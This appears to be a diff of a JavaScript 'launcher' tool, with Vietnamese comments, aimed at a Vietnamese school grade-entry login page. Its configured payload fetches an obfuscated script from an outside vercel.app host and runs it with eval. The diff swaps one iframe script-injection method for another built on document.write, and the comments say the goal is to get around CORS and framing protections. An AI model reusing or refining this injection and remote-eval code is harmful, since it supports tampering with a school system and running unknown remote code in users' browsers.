@@ -1,10 +1,11 @@
 // ============================================================
-// NT4NH2 // LAUNCHER SCRIPT (IFRAME INJECTION METHOD)
-// Lách CORS bằng cách nhúng trang đích vào iframe và tiêm script
+// NT4NH2 // LAUNCHER SCRIPT (DATA URI INJECTION BYPASS)
+// Lách CORS bằng kỹ thuật document.write vào iframe trắng
 // ============================================================
 
 const DEFAULT_CONFIG = {
   targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
+  // Đã sửa lại đường dẫn fetch có https://
   payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
   delay: 1500,
   title: "Launcher Tool",
@@ -62,17 +63,16 @@ function setStatus(msg) {
   statusEl.textContent = "Trạng thái: " + msg;
 }
 
-// Kỹ thuật Inject lách CORS
+// Hàm khởi tạo Inject
 function launchTool() {
   popupShown = false;
   setStatus("Đang khởi tạo môi trường Inject...");
 
-  // Xóa iframe cũ nếu có
   if (currentIframe) {
     currentIframe.remove();
   }
 
-  // Tạo iframe ẩn để load trang đích
+  // Tạo iframe full màn hình
   currentIframe = document.createElement("iframe");
   currentIframe.style.width = "100vw";
   currentIframe.style.height = "100vh";
@@ -83,44 +83,39 @@ function launchTool() {
   currentIframe.style.background = "#fff";
   currentIframe.style.border = "none";
   
-  // Gắn iframe vào body
   document.body.appendChild(currentIframe);
 
-  // Chờ iframe tải xong
-  currentIframe.onload = () => {
-    setStatus("Đã tải iframe. Đang tiến hành tiêm mã...");
-    
-    setTimeout(() => {
-      try {
-        // Lấy document của iframe
-        const iframeDoc = currentIframe.contentWindow.document;
-        
-        // Tạo thẻ script chứa payload
-        const script = iframeDoc.createElement("script");
-        script.textContent = CONFIG.payload;
-        
-        // Chèn vào thẻ head của trang đích bên trong iframe
-        iframeDoc.head.appendChild(script);
-        
-        setStatus("Inject thành công. Đang giám sát...");
-      } catch (e) {
-        // Nếu trang đích có header X-Frame-Options hoặc CSP chặn iframe
-        console.error("Lỗi Inject:", e);
-        setStatus("Lỗi: Trang đích chặn iframe hoặc CORS.");
-        onToolClosed();
-      }
-      startWatch();
-    }, CONFIG.delay);
-  };
+  // Kỹ thuật tạo iframe cùng domain (about:blank)
+  const iframeDoc = currentIframe.contentWindow.document;
+  iframeDoc.open();
+  iframeDoc.write(`
+    <!DOCTYPE html>
+    <html>
+      <head>
+        <script>
+          // Chèn payload vào đây để nó chạy ngay khi trang đích load
+          window.onload = function() {
+            setTimeout(function() {
+              ${CONFIG.payload}
+            }, 500);
+          };
+        </script>
+      </head>
+      <body style="margin:0; padding:0;">
+        <!-- Nhúng trang đích vào đây -->
+        <iframe src="${CONFIG.targetUrl}" style="width:100%; height:100vh; border:none;"></iframe>
+      </body>
+    </html>
+  `);
+  iframeDoc.close();
 
-  // Load URL đích vào iframe
-  currentIframe.src = CONFIG.targetUrl;
+  setStatus("Đã tiêm payload. Đang giám sát...");
+  startWatch();
 }
 
 function startWatch() {
   stopWatch();
   watchTimer = setInterval(() => {
-    // Kiểm tra nếu iframe bị xóa hoặc không còn tồn tại
     if (!currentIframe || !document.body.contains(currentIframe)) {
       stopWatch();
       onToolClosed();
